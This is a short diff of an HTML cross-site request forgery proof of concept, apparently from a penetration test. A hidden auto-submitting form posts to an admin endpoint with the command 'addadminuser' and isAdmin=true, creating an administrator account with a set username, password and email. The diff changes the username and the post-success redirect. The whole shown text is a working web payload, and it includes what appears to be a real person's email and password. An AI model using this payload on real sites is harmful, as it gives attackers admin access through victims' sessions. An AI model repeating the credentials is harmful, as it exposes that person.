@@ -4,7 +4,7 @@
     <form action="https://pentestsystem2.cxaff.com/admin/" method="POST">
       <input type="hidden" name="command" value="addadminuser" />
       <input type="hidden" name="json" value="1" />
-      <input type="hidden" name="username" value="chaimsr" />
+      <input type="hidden" name="username" value="csrfpoc" />
       <input type="hidden" name="password" value="&#64;Gmail1151" />
       <input type="hidden" name="Email" value="chaimshuster&#32;8&#64;gmail&#46;com" />
       <input type="hidden" name="isAdmin" value="true" />
@@ -20,7 +20,7 @@
           })
           .then(function(response) {
             if (response.ok) {
-              window.location.href = 'https://www.google.com'; // Redirect on successful form submission
+              window.location.href = 'https://pentestsystem2.cxaff.com/app'; // Redirect on successful form submission
             } else {
               console.error('Form submission failed');
             }
